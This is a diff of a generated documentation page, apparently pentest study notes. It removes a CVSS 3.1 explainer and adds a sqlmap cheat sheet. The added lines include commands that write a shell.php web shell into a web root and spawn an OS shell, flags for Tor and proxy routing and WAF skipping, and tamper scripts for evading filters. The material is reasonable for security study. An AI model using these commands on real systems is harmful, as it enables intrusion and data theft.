+<td><code>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</code></td>
+<td>Writing a file</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "http://www.example.com/?id=1" --os-shell</code></td>
+<td>Spawning an OS shell</td>
 </tr>
 </tbody>
 </table>
-<h3 id="cvss-31">CVSS 3.1</h3>
-<h4 id="attack-vector">Attack Vector</h4>
-<p>Shows how the vulnerability can be exploited.</p>
+<h2 id="tips">Tips</h2>
 <ul>
-<li><strong>Network (N)</strong>: Attackers can only exploit this vulnerability through the network layer (remotely exploitable).</li>
-<li><strong>Adjacent (A)</strong>: Attackers can exploit this vulnerability only if they reside in the same physical or logical network (secure VPN included).</li>
-<li><strong>Local (L)</strong>: Attackers can exploit this vulnerability only by accessing the target system locally (e.g., keyboard, terminal, etc.) or remotely (e.g., SSH) or through user interaction.</li>
-<li><strong>Physical (P)</strong>: Attackers can exploit this vulnerability through physical interaction/manipulation.</li>
+<li>Increase risk when testing login forms to use OR payloads</li>
+<li>The '--all' switch in combination with the '--batch' switch, will automaically do the whole enumeration process on the target itself, and provide the entire enumeration details. </li>
 </ul>
-<h4 id="attack-complexity">Attack Complexity</h4>
-<p>Depicts the conditions beyond the attackers' control and must be present to exploit the vulnerability successfully.</p>
-<ul>
-<li><strong>Low (L)</strong>: No special preparations should take place to exploit the vulnerability successfully. The attackers can exploit the vulnerability repeatedly without any issue.</li>
-<li><strong>High (H)</strong>: Special preparations and information gathering should take place to exploit the vulnerability successfully.</li>
-</ul>
-<h4 id="privileges-required">Privileges Required</h4>
-<p>Show the level of privileges the attacker must have to exploit the vulnerability successfully.</p>
-<ul>
-<li><strong>None (N)</strong>: No special access related to settings or files is required to exploit the vulnerability successfully. The vulnerability can be exploited from an unauthorised perspective.</li>
-<li><strong>Low (L)</strong>: Attackers should possess standard user privileges to exploit the vulnerability successfully. The exploitation in this case usually affects files and settings owned by a user or non-sensitive assets.</li>
-<li><strong>High (H)</strong>: Attackers should possess admin-level privileges to exploit the vulnerability successfully. The exploitation in this case usually affects the entire vulnerable system.</li>
-</ul>
-<h4 id="user-interaction">User Interaction</h4>
-<p>Shows if attackers can successfully exploit the vulnerability on their own or user interaction is required.</p>
-<ul>
-<li><strong>None (N)</strong>: Attackers can successfully exploit the vulnerability independently.</li>
-<li><strong>Required (R)</strong>: A user should take some action before the attackers can successfully exploit the vulnerability.</li>
-</ul>
-<h4 id="scope">Scope</h4>
-<p>Shows if successful exploitation of the vulnerability can affect components other than the affected one.</p>
-<ul>
-<li><strong>Unchanged (U)</strong>: Successful exploitation of the vulnerability affects the vulnerable component or affects resources managed by the same security authority.</li>
-<li><strong>Changed (C)</strong>: Successful exploitation of the vulnerability can affect components other than the affected one or resources beyond the scope of the affected component's security authority.</li>
-</ul>
-<h4 id="confidentiality">Confidentiality</h4>
-<p>Shows how much the vulnerable component's confidentiality is affected upon successfully exploiting the vulnerability. Confidentiality limits information access and disclosure to authorised users only and prevents unauthorised users from accessing information.</p>
-<ul>
-<li><strong>None (N)</strong>: The confidentiality of the vulnerable component does not get impacted.</li>
-<li><strong>Low (L)</strong>: The vulnerable component will experience some loss of confidentiality upon successful exploitation of the vulnerability. In this case, the attackers do not have control over what information is obtained.</li>
-<li><strong>High (H)</strong>: The vulnerable component will experience total (or serious) loss of confidentiality upon successfully exploiting the vulnerability. In this case, the attackers have total (or some) control over what information is obtained.</li>
-</ul>
-<h4 id="integrity">Integrity</h4>
-<p>Shows how much the vulnerable component's integrity is affected upon successfully exploiting the vulnerability. Integrity refers to the trustworthiness and veracity of information.</p>
-<ul>
-<li><strong>None (N)</strong>: The integrity of the vulnerable component does not get impacted.</li>
-<li><strong>Low (L)</strong>: Attackers can modify data in a limited manner on the vulnerable component upon successfully exploiting the vulnerability. Attackers do not have control over the consequence of a modification, and the vulnerable component does not get seriously affected in this case.</li>
-<li><strong>High (H)</strong>: Attackers can modify all or critical data on the vulnerable component upon successfully exploiting the vulnerability. Attackers have control over the consequence of a modification, and the vulnerable component will experience a total loss of integrity.</li>
-</ul>
-<h4 id="availability">Availability</h4>
-<p>Shows how much the vulnerable component's availability is affected upon successfully exploiting the vulnerability. Availability refers to the accessibility of information resources in terms of network bandwidth, disk space, processor cycles, etc.</p>
-<ul>
-<li><strong>None (N)</strong>: The availability of the vulnerable component does not get impacted.</li>
-<li><strong>Low (L)</strong>: The vulnerable component will experience some loss of availability upon successfully exploiting the vulnerability. The attacker does not have complete control over the vulnerable component's availability and cannot deny the service to users, and performance is just reduced.</li>
-<li><strong>High (H)</strong>: The vulnerable component will experience total (or severe) availability loss upon successfully exploiting the vulnerability. The attacker has complete (or significant) control over the vulnerable component's availability and can deny the service to users. Performance is significantly reduced.</li>
-</ul>
+<h2 id="additional-flags">Additional Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--crawl</code>, <code>--forms</code> or <code>-g</code></td>
+<td>Used for automatic parameter finding</td>
+</tr>
+<tr>
+<td><code>--parse-errors</code></td>
+<td>Display errors</td>
+</tr>
+<tr>
+<td><code>--proxy</code></td>
+<td>Send requests through a proxy like burp</td>
+</tr>
+<tr>
+<td><code>--proxy-file</code></td>
+<td>work sequentially through a list of proxies</td>
+</tr>
+<tr>
+<td><code>--tor</code></td>
+<td>Use tor as a proxy, needs tor running locally</td>
+</tr>
+<tr>
+<td><code>--check-tor</code></td>
+<td>Check tor proxy configured correctly</td>
+</tr>
+<tr>
+<td><code>--code=200</code></td>
+<td>Test for specific HTTP response code</td>
+</tr>
+<tr>
+<td><code>--titles</code></td>
+<td>Base comparison on the content of the <code>&lt;title&gt;</code> tag</td>
+</tr>
+<tr>
+<td><code>--string=success</code></td>
+<td>Check for specific string value in response</td>
+</tr>
+<tr>
+<td><code>--not-string=error</code></td>
+<td>Check for the lack of specified string in response</td>
+</tr>
+<tr>
+<td><code>--text-only</code></td>
+<td>Removes all HTML tags from response, basing comparison on only textual content</td>
+</tr>
+<tr>
+<td><code>--technique=BEU</code></td>
+<td>Specify techniques used (default BEUSTQ)</td>
+</tr>
+<tr>
+<td><code>--union-cols=17</code></td>
+<td>Specify the number of columns used in union queries (if known)</td>
+</tr>
+<tr>
+<td><code>--union-char='a'</code></td>
+<td>Specify dummy values for union queries</td>
+</tr>
+<tr>
+<td><code>--union-from=users</code></td>
+<td>Specify the FROM appendix for union queries</td>
+</tr>
+<tr>
+<td><code>--no-cast</code></td>
+<td>Don't use casting (CAST(value AS CHAR))</td>
+</tr>
+<tr>
+<td><code>--hex</code></td>
+<td>Hex encode database response</td>
+</tr>
+<tr>
+<td><code>--dump-format</code></td>
+<td>Specify format to dump table in, e.g. HTML or SQLite</td>
+</tr>
+<tr>
+<td><code>--skip-waf</code></td>
+<td>Skip WAF check test</td>
+</tr>
+<tr>
+<td><code>--chunked</code></td>
+<td>Request body into chunks, blacklisted SQL keywords are split between chunks</td>
+</tr>
+<tr>
+<td><code>--hpp</code></td>
+<td>Payloads are split between different same parameter named values which are concatenated by the target platform if supporting it (e.g. ASP)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="common-sqlmap-tamper-scripts">Common SQLMap Tamper Scripts</h2>
+<table>
+<thead>
+<tr>
+<th>Tamper-Script</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0eunion</td>
+<td>Replaces UNION with e0UNION</td>
+</tr>
+<tr>
+<td>base64encode</td>
+<td>Base64-encodes all payload characters</td>
+</tr>
+<tr>
+<td>between</td>
+<td>Replaces &gt; with NOT BETWEEN 0 AND #; = with BETWEEN # AND #</td>
+</tr>
+<tr>
+<td>commalesslimit</td>
+<td>Replaces MySQL LIMIT M, N with LIMIT N OFFSET M</td>
+</tr>
+<tr>
+<td>equaltolike</td>
+<td>Replaces = with LIKE</td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords</td>
+<td>Adds MySQL versioned comment before keywords</td>
+</tr>
+<tr>
+<td>modsecurityversioned</td>
+<td>Wraps query with MySQL versioned comment</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned</td>
+<td>Wraps query with MySQL zero-versioned comment</td>
+</tr>
+<tr>
+<td>percentage</td>
+<td>Adds % before each character (e.g., SELECT -&gt; %S%E%L%E%C%T)</td>
+</tr>
+<tr>
+<td>plus2concat</td>
+<td>Replaces + with MsSQL CONCAT() function</td>
+</tr>
+<tr>
+<td>randomcase</td>
+<td>Randomizes case of keyword characters (e.g., SELECT -&gt; SEleCt)</td>
+</tr>
+<tr>
+<td>space2comment</td>
+<td>Replaces space with comment <code>/*</code></td>
+</tr>
+<tr>
+<td>space2dash</td>
+<td>Replaces space with dash comment (--)</td>
+</tr>
+<tr>
+<td>space2hash</td>
+<td>Replaces space with MySQL # comment</td>
+</tr>
+<tr>
+<td>space2mssqlblank</td>
+<td>Replaces space with MsSQL blank character</td>
+</tr>
+<tr>
+<td>space2plus</td>
+<td>Replaces space with plus (+)</td>
+</tr>
+<tr>
+<td>space2randomblank</td>
+<td>Replaces space with random blank character</td>
+</tr>
+<tr>
+<td>symboliclogical</td>
+<td>Replaces AND/OR with &amp;&amp;/</td>
+</tr>
+<tr>
+<td>versionedkeywords</td>
+<td>Wraps non-function keywords with MySQL comment</td>
+</tr>
+<tr>
+<td>versionedmorekeywords</td>
+<td>Wraps all keywords with MySQL comment</td>
+</tr>
+</tbody>
+</table>
 
 
 
@@ -2257,10 +2440,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
